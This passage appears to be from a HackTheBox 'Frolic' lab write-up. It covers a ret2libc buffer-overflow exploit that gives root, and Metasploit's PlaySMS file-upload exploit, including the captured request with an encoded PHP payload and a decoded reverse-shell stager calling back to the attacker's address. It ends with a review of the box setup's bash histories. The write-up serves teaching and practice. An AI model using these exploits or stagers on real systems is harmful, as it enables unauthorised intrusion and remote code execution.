    gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
    Starting program: /media/sf_CTFs/hackthebox/frolic-10.10.10.111/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x79 ('y')
    EBX: 0xffffd150 --> 0x2
    ECX: 0x0
    EDX: 0xf7f99890 --> 0x0
    ESI: 0xf7f98000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x31414162 ('bAA1')
    ESP: 0xffffd120 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    EIP: 0x41474141 ('AAGA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41474141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd120 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0004| 0xffffd124 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0008| 0xffffd128 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0012| 0xffffd12c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0016| 0xffffd130 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0020| 0xffffd134 ("AA4AAJAAfAA5AAKAAgAA6AAL")
    0024| 0xffffd138 ("AJAAfAA5AAKAAgAA6AAL")
    0028| 0xffffd13c ("fAA5AAKAAgAA6AAL")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41474141 in ?? ()
    

When the program crashes, I can take EIP and find out where that was in the pattern using . I can use the ASCII or hex value:`pattern offset`

    gdb-peda$ pattern offset AAGA
    AAGA found at offset: 52
    gdb-peda$ pattern offset 0x41474141
    1095188801 found at offset: 52
    

To double check that, I’ll send in a buffer of 52 As and then 4 Bs:

    $ python -c 'print("A" * 52 + "BBBB")'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
    

    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
    Starting program: /media/sf_CTFs/hackthebox/frolic-10.10.10.111/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x38 ('8')
    EBX: 0xffffd170 --> 0x2
    ECX: 0x0
    EDX: 0xf7f99890 --> 0x0
    ESI: 0xf7f98000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd140 --> 0xffffd300 --> 0x11
    EIP: 0x42424242 ('BBBB')
    EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x42424242
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd140 --> 0xffffd300 --> 0x11
    0004| 0xffffd144 --> 0xffffd204 --> 0xffffd3ac ("/media/sf_CTFs/hackthebox/frolic-10.10.10.111/rop")
    0008| 0xffffd148 --> 0xffffd210 --> 0xffffd417 ("LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2")
    0012| 0xffffd14c --> 0x8048561 (<__libc_csu_init+33>:   lea    eax,[ebx-0xf8])
    0016| 0xffffd150 --> 0xffffd170 --> 0x2
    0020| 0xffffd154 --> 0x0
    0024| 0xffffd158 --> 0x0
    0028| 0xffffd15c --> 0xf7ddb9a1 (<__libc_start_main+241>:       add    esp,0x10)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x42424242 in ?? ()
    

Crash, with EIP as BBBB. Perfect.

### Addresses

Now I just need the addresses of , , and in libc. This will vary on different hosts, so I’ll get the info with my shell on Frolic. First, I’ll get the base libc address with :`system``exit``/bin/sh``ldd`

    www-data@frolic:/home/ayush/.binary$ ldd rop 
            linux-gate.so.1 =>  (0xb7fda000)
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)    <-- this!
            /lib/ld-linux.so.2 (0xb7fdb000)
    

Next, I’ll use to get the offsets to various functions, and grep out and :`readelf -s``system``exit`

    www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"
      1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
    
    www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"
       141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
    

Now I’ll use to get the strings from libc with hex offsets, and grep for “/bin/sh”:`strings -a -t x`

    www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
     15ba0b /bin/sh
    

Now I can calculate the address for each of the three using any calculator ( here):`gdb`

    gdb-peda$ p 0xb7e19000 + 0x0003ada0
    $4 = 0xb7e53da0  # system
    
    gdb-peda$ p 0xb7e19000 + 0x15ba0b
    $5 = 0xb7f74a0b  # /bin/sh
    
    gdb-peda$ p 0xb7e19000 + 0x0002e9d0
    $6 = 0xb7e479d0  # exit
    

### Exploit

I can put that all together into this template: . I could write a python script to do this, but this case is simple enough that I can just do it as a one-liner. When I run that on Frolic, I’m root:`"A" * 52 + SYSTEM + EXIT + /bin/sh`

    www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
    # id
    uid=0(root) gid=33(www-data) groups=33(www-data)
    

And I can get :`root.txt`

    root@frolic:/root# cat root.txt 
    85d3fdf0...
    

## Beyond Root

### Metasploit PlaySMS Exploit

I noticed that Metasploit has an exploit for the same PlaySMS vulnerability that I used (second one below):

    msf5 > search playsms
    
    Matching Modules
    ================
    
       Name                                       Disclosure Date  Rank       Check  Description
       ----                                       ---------------  ----       -----  -----------
       exploit/multi/http/playsms_filename_exec   2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution
       exploit/multi/http/playsms_uploadcsv_exec  2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
    

#### Setup

I set up Burp to listen on port 81 and forward to Frolic 9999:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1552492836001.png)

I pointed the exploit at :`localhost:81`

    msf5 exploit(multi/http/playsms_uploadcsv_exec) > options
    
    Module options (exploit/multi/http/playsms_uploadcsv_exec):
    
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       PASSWORD   idkwhatispass    yes       Password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS     127.0.0.1        yes       The target address range or CIDR identifier
       RPORT      81               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /playsms/        yes       Base playsms directory path
       USERNAME   admin            yes       Username to authenticate with
       VHOST                       no        HTTP server virtual host
    
    
    Payload options (php/meterpreter/reverse_tcp):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.5       yes       The listen address (an interface may be specified)
       LPORT  445              yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   PlaySMS 1.4
    

#### Run It

When I run it, I see five http requests:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540895038825.png)

The last one has exploit:

    POST /playsms/index.php?op=import&route=import&inc=feature_phonebook&app=main HTTP/1.1
    Host: 127.0.0.1:9999
    User-Agent: eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKEx5bzhQM0JvY0NBdktpb3ZJR1Z5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNnSkdsd0lEMGdKekV3TGpFd0xqRTBMalVuT3lBa2NHOXlkQ0E5SURRME5EUTdJR2xtSUNnb0pHWWdQU0FuYzNSeVpXRnRYM052WTJ0bGRGOWpiR2xsYm5RbktTQW1KaUJwYzE5allXeHNZV0pzWlNna1ppa3BJSHNnSkhNZ1BTQWtaaWdpZEdOd09pOHZleVJwY0gwNmV5UndiM0owZlNJcE95QWtjMTkwZVhCbElEMGdKM04wY21WaGJTYzdJSDBnYVdZZ0tDRWtjeUFtSmlBb0pHWWdQU0FuWm5OdlkydHZjR1Z1SnlrZ0ppWWdhWE5mWTJGc2JHRmliR1VvSkdZcEtTQjdJQ1J6SUQwZ0pHWW9KR2x3TENBa2NHOXlkQ2s3SUNSelgzUjVjR1VnUFNBbmMzUnlaV0Z0SnpzZ2ZTQnBaaUFvSVNSeklDWW1JQ2drWmlBOUlDZHpiMk5yWlhSZlkzSmxZWFJsSnlrZ0ppWWdhWE5mWTJGc2JHRmliR1VvSkdZcEtTQjdJQ1J6SUQwZ0pHWW9RVVpmU1U1RlZDd2dVMDlEUzE5VFZGSkZRVTBzSUZOUFRGOVVRMUFwT3lBa2NtVnpJRDBnUUhOdlkydGxkRjlqYjI1dVpXTjBLQ1J6TENBa2FYQXNJQ1J3YjNKMEtUc2dhV1lnS0NFa2NtVnpLU0I3SUdScFpTZ3BPeUI5SUNSelgzUjVjR1VnUFNBbmMyOWphMlYwSnpzZ2ZTQnBaaUFvSVNSelgzUjVjR1VwSUhzZ1pHbGxLQ2R1YnlCemIyTnJaWFFnWm5WdVkzTW5LVHNn.ZlNCcFppQW9JU1J6S1NCN0lHUnBaU2duYm04Z2MyOWphMlYwSnlrN0lIMGdjM2RwZEdOb0lDZ2tjMTkwZVhCbEtTQjdJR05oYzJVZ0ozTjBjbVZoYlNjNklDUnNaVzRnUFNCbWNtVmhaQ2drY3l3Z05DazdJR0p5WldGck95QmpZWE5sSUNkemIyTnJaWFFuT2lBa2JHVnVJRDBnYzI5amEyVjBYM0psWVdRb0pITXNJRFFwT3lCaWNtVmhhenNnZlNCcFppQW9JU1JzWlc0cElIc2daR2xsS0NrN0lIMGdKR0VnUFNCMWJuQmhZMnNvSWs1cy5aVzRpTENBa2JHVnVLVHNnSkd4bGJpQTlJQ1JoV3lkc1pXNG5YVHNnSkdJZ1BTQW5KenNnZDJocGJHVWdLSE4wY214bGJpZ2tZaWtnUENBa2JHVnVLU0I3SUhOM2FYUmphQ0FvSkhOZmRIbHdaU2tnZXlCallYTmxJQ2R6ZEhKbFlXMG5PaUFrWWlBdVBTQm1jbVZoWkNna2N5d2dKR3hsYmkxemRISnNaVzRvSkdJcEtUc2dZbkpsWVdzN0lHTmhjMlVnSjNOdlkydGxkQ2M2SUNSaUlDNDlJSE52WTJ0bGRGOXlaV0ZrS0NSekxDQWtiR1Z1TFhOMGNteGxiaWdrWWlrcE95QmljbVZoYXpzZ2ZTQjlJQ1JIVEU5Q1FVeFRXeWR0YzJkemIyTnJKMTBnUFNBa2N6c2dKRWRNVDBKQlRGTmJKMjF6WjNOdlkydGZkSGx3WlNkZElEMGdKSE5mZEhsd1pUc2dhV1lnS0dWNGRHVnVjMmx2Ymw5c2IyRmtaV1FvSjNOMWFHOXphVzRuS1NBbUppQnBibWxmWjJWMEtDZHpkV2h2YzJsdUx.tVjRaV04xZEc5eUxtUnBjMkZpYkdWZlpYWmhiQ2NwS1NCN0lDUnpkV2h2YzJsdVgySjVjR0Z6Y3oxamNtVmhkR1ZmWm5WdVkzUnBiMjRvSnljc0lDUmlLVHNnSkhOMWFHOXphVzVmWW5sd1lYTnpLQ2s3SUgwZ1pXeHpaU0I3SUdWMllXd29KR0lwT3lCOUlHUnBaU2dwT3cpKTs));
    Cookie: PHPSESSID=lide38l4425upb04gebiqerv15;
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=_Part_935_3834005415_198461700
    Content-Length: 369
    Connection: close
    
    --_Part_935_3834005415_198461700
    Content-Disposition: form-data; name="X-CSRF-Token"
    
    777475c01c9790a6400c7464292064d6
    --_Part_935_3834005415_198461700
    Content-Disposition: form-data; name="fnpb"; filename="agent22.csv"
    Content-Type: text/csv
    
    Name,Email,Department
    <?php $t=$_SERVER['HTTP_USER_AGENT']; eval($t); ?>,49,35
    --_Part_935_3834005415_198461700--
    

It is doing the same thing I did, with the payload in the user agent.

#### Payload

The payload is to . I’ll decode that blob myself to find another one:`eval(base64_decode(blob))`

    eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE0LjUnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5s.ZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw));
    

Decoding the next base64 gives php (I’ve added whitespace):

      1 /*<?php /**/ error_reporting(0);
      2 $ip = '10.10.14.5';
      3 $port = 4444;
      4 if (($f = 'stream_socket_client') && is_callable($f)) {
      5     $s = $f("tcp://{$ip}:{$port}");
      6     $s_type = 'stream';
      7 }
      8 if (!$s && ($f = 'fsockopen') && is_callable($f)) {
      9     $s = $f($ip, $port);
     10     $s_type = 'stream';
     11 }
     12 if (!$s && ($f = 'socket_create') && is_callable($f)) {
     13     $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
     14     $res = @socket_connect($s, $ip, $port);
     15     if (!$res) {
     16         die();
     17     }
     18     $s_type = 'socket';
     19 }
     20 if (!$s_type) {
     21     die('no socket funcs');
     22 }
     23 if (!$s) {
     24     die('no socket');
     25 }
     26 switch ($s_type) {
     27     case 'stream':
     28         $len = fread($s, 4);
     29         break;
     30     case 'socket':
     31         $len = socket_read($s, 4);
     32         break;
     33 }
     34 if (!$len) {
     35     die();
     36 }
     37 $a = unpack("Nlen", $len);
     38 $len = $a['len'];
     39 $b = '';
     40 while (strlen($b) < $len) {
     41     switch ($s_type) {
     42         case 'stream':
     43             $b .= fread($s, $len-strlen($b));
     44             break;
     45         case 'socket':
     46             $b .= socket_read($s, $len-strlen($b));
     47             break;
     48     }
     49 }
     50 $GLOBALS['msgsock'] = $s;
     51 $GLOBALS['msgsock_type'] = $s_type;
     52 if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {
     53     $suhosin_bypass=create_function('', $b);
     54     $suhosin_bypass();
     55 } else {
     56     eval($b);
     57 }
     58 die();
    

Here’s what I see in the code:

*   Lines 1-25 set up the connection back to the Metasploit listener, trying a few different things until something works.
*   Lines 26-33 read four bytes from the the socket, which will represent the length of the next read.
*   Lines 34-36 exit if it didn’t succeed in reading anything.
*   Lines 37-38 convert the length to an number.
*   Line 39 initializes to an empty string.`$b`
*   Lines 40-49 loop reading from the socket into until the full length is read.`$b`
*   Lines 52-57 checks if is loaded. If so, it tries to create a bypass and call it. Otherwise, it just passes the newly read stage into . [Suhosin](https://suhosin.org/stories/index.html) is a protection system for PHP that attempts to protect against exploitation.`suhosin``eval`

### Bash Histories

While neither is readable from my initial www-data shell, both users have files. It’s neat to look at them and see the box being set up.`.bash_history`

#### ayush

This user is largely focused on testing the binary:`rop`

    ...[snip]...
    chmod +x rop                        
    ls                                                    
    ./rop                                                                                
    ./rop adlkajaiaduiaidsdjasi
    ./rop adlkajaiaduiaidsdjasidaijdaijdaisjd
    ls           
    ./rop $(seq 1 1000)
    seq           
    seq 1 100     
    ./rop $(seq 1 1000)
    ./rop $(seq 1 10)          
    ls   
    whoami                   
    vi exploit.py
    ls               
    python exploit.py    
    ls     
    cat exploit.py
    ls
    python exploit.py rop
    ls
    whoami
    ...[snip]...
    python exploit.py
    ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApx��JUNKhi��
    exit
    ls
    whoami
    ls
    ./rop
    python exploit.py
    ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApx��JUNKhi��
    ls
    sudo ./rop
    ls
    ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaasssssssssssssssssssssssssssssssssssss
    ls
    ./rop $(python exploit.py)
    ...[snip]...
    

I can see this user compile the binary:

    gcc -m32 -fno-stack-protector -no-pie -o file rop.c
    

And later work on an exploit:

    ./file `python exploit.py`
    gdb file
    ldd file
    # 0xb7e19000 this is libc_base
    strings -atx /lib/i386-linux-gnu/libc.so.6 | grep system
    lss file
    ldd file
    strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
    vim exploit.py
    ./file `python exploit.py`
    didt worked :D
    #why not working
    #checking
    ldd file
    readelf -s file | system
    readelf -s file | grep system
    readlef -s /lib/i386-linux-gnu/libc.so.6 | grep system
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
    # that is correct one
    

And finally moves the binary to , and moves it to :`.binary``rop`

    mkdir .binary
    ls
    cd .binary/
    ls
    mv ../file .
    ls
    cd ../
    ls
    rm exploit.py
    ls
    exit
    ls
    cd
    ls
    chmod +x user.txt
    chmod 755 user.txt
    ks
    ls
    cd .binary/
    ls
    mv file rop
    

#### sahay

This user has an even longer history. I won’t show it all, but walk through some interesting parts.

This user does a lot of the website config:

    mysql_secure_installation
    ks
    ls
    exit
    ls
    apt remove apache
    apt remove apache2
    service apache2 stop
    apt purge apache2
    sudo apt-get install nginx
    ls
    service nginx start
    sudo apt-get install php-fpm php-mysql
    sudo nano /etc/php/7.0/fpm/php.ini
    sudo systemctl restart php7.0-fpm
    sudo nano /etc/nginx/sites-available/default
    sudo nginx -t
    sudo systemctl reload nginx
    sudo nano /var/www/html/info.php
    ifconfig                                                                                                                                                                                                                                                                            
    ls
    sudo rm /var/www/html/info.php
    sudo nano /etc/nginx/sites-enabled/node-red.example.com
    ls
    exit
    node-red
    sudo nano /etc/systemd/system/node-red.service
    cay [Unit]
    Description=Node-RED
    After=syslog.target network.target
    [Service]
    ExecStart=/usr/local/bin/node-red-pi --max-old-space-size=128 -v
    Restart=on-failure
    KillSignal=SIGINT
    # log output to syslog as 'node-red'
    SyslogIdentifier=node-red
    StandardOutput=syslog
    # non-root user to run as
    WorkingDirectory=/home/sammy/
    User=sammy
    Group=sammy
    [Install]
    WantedBy=multi-user.target
    ls
    cat /etc/systemd/system/node-red.service
    sudo systemctl enable node-red
    sudo systemctl start node-red
    sudo systemctl stop node-red
    node-red-admin hash-pw
    nano ~/.node-red/settings.js
    ls
    sudo ufw deny 1880
    sudo systemctl restart node-red
    ls
    sudo ufw allow 1880
    node-red-admin hash-pw
    nano ~/.node-red/settings.js
    service node-red restart
    

Here he sets up PlaySMS (twice…there’s actually more):

    wget -c http://ncu.dl.sourceforge.net/project/playsms/playsms/Version%201.4/playsms-1.4.tar.gz
    git clone https://github.com/antonraharja/playSMS.git
    ls
    cd playSMS/
    ls
    cd ../
    ls
    mv playSMS/ playsms
    vi /var/www/html/playsms/init.php
    ls
    cd playsms/
    ls
    cd ../
    ls
    rm -rf playsms/
    wget https://github.com/antonraharja/playSMS/archive/1.4.zip
    ls
    unzip 1.4.zip
    apt install unzip
    unzip 1.4.zip
    ls
    cd playSMS-1.4/
    ls
    cp install.conf.dist install.conf
    vi install.conf
    mysql -u root -p
    ;s
    ls
    vi install
    vi install.conf
    ./install-playsms.sh
    ls
    vi install.conf
    mysql -u root -p
    ls
    ./install-playsms.sh
    service playsmsd status
    service playsmsd start
    playsmsd restart
    playsmsd /etc/playsmsd.conf start
    ./composer update
    playsmsd /etc/playsmsd.conf start
    ls
    service playsmsd status
    

Here the user makes the rabbit hole, which I basically avoided:`loop`

    mkdir loop
    ls
    cd loop/
    ls
    cd ../
    ls
    cd loop/
    ls
    ln -s ../loop/
    ls
    cd loop
    ls
    cd loop
    ls
    cd loop
    ls
    cd ../../../
    ls
    cd ../
    ls
    chmod 755 loop/
    ls
    chown www-data:www-data loop/
    ...[snip]...
    cd loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop/loop
    ls
    pwd
    

Makes the admin site:

    mkdir admin
    l
    ls
    cd admin/
    ls
    vi style.css
    ls
    vi login.js
    ls
    vi index.html
    ls
    vi index.html
    ls
    mkdir js
    mv login.js js/
    ls
    vi success.html
    ls
    mkdir css
    mv style.css css/
    

Creates the password… at first just four base64-encodings, but then replacing it with zipped content:

    echo "idkwhatispass" | base64                                                                                                                                                                                                                                                        
    ls                                                                                                                                                                                                                                                                                   
    vi pass.txt                                                                                                                                                                                                                                                                          
    ls
    cat pass.txt | base64
    cat pass.txt | base64 | base64
    cat pass.txt | base64 | base64 | base64
    cat pass.txt | base64 | base64 | base64 | base64 > file
    ls
    cat file
    ls
    rm pass.txt
    ls
    clear
    ls
    cat file | base64 -d
    cat file | base64 -d  | base64 -0d
    cat file | base64 -d  | base64 -d
    cat file | base64 -d  | base64 -d| base64 -d
    cat file | base64 -d  | base64 -d| base64 -d | base64 -d
    echo "aWRrd2hhdGlzcGFzcwo=" | base64
    echo "aWRrd2hhdGlzcGFzcwo=" | base64 -d
    ls
    clear
    ls
    clear
    ls
    zip --help
    apt install zip
    zip file
    ls
    zip --help
    zip -e
    ls
    zip -e file
    ls
    zip -e file > file.zip
    ls
    unzip file.zip
    ls
    rm file
    ls
    unzip file.zip
    mv file.zip file
    ls
    cat file
    ls
    rm file
    ls
    vi file
    ls
    cat file
    cat file | base64
    cat file | base64 > pass
    ...[snip]...
    cat crack.zip | base64
    cat crack.zip | base64 > index.php
    

Installs NodeRed:

    sudo apt-get install nodejs-legacy
    ls
    s
    sudo apt-get install npm
    s
    sudo apt-get install npm
    sudo apt-get install nodejs-legacy
    node -v
    v4.2.6
    sudo apt-get install npm
    npm -v
    sudo npm install -g --unsafe-perm node-red node-red-admin
    Reading state information... Done
    npm is already the newest version (3.5.2-0ubuntu4).
    0 upgraded, 0 newly installed, 0 to remove and 155 not upgraded.
    root@frolic:~# npm -v
    3.5.2
    root@frolic:~# sudo npm install -g --unsafe-perm node-red node-red-admin
    loadDep:bcrypt → 200      ▐ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    loadDep:bcrypt → network  ▄ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    Reading state information... Done
    npm is already the newest version (3.5.2-0ubuntu4).
    0 upgraded, 0 newly installed, 0 to remove and 155 not upgraded.
    root@frolic:~# npm -v
    3.5.2
    root@frolic:~# sudo npm install -g --unsafe-perm node-red node-red-admin
    loadDep:bcrypt → 200      ▐ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    loadDep:bcrypt → network  ▄ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    █████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    loadDep:bcrypt → network  ▄ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    loadDep:punycode → 200    ▄ ╢█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    loadDep:type-is → network ▐ ╢██████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
    sudo ufw allow 1880
    

Disables ASLR:

    echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf
    

Does some more binary overflow testing, and sets setuid:

    rm rop
    ls                                                             
    vi rop.c
    ls       
    gcc -m32 -no-pie -o rop rop.c
    ls                 
    ./rop         
    ls 
    ./rop asdiahdiasdiasidaisdj
    sjadiasjdiasjdisadas
    ls                  
    python exploit.py
    exit              
    ls
    cd /home
    ls    
    cd ayush/
    ls      
    chown root:root rop
    chmod 4755 rop          
    ls
    su ayush
    ls
    chown root:root file
    ls
    chmod 4755 file
    

Installs :`gdb`

    gdb
    apt install gdb
    

Sets :`root.txt`

    vi root.txt
    ls
    chmod 600 root.txt
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2019/03/23/htb-frolic.html)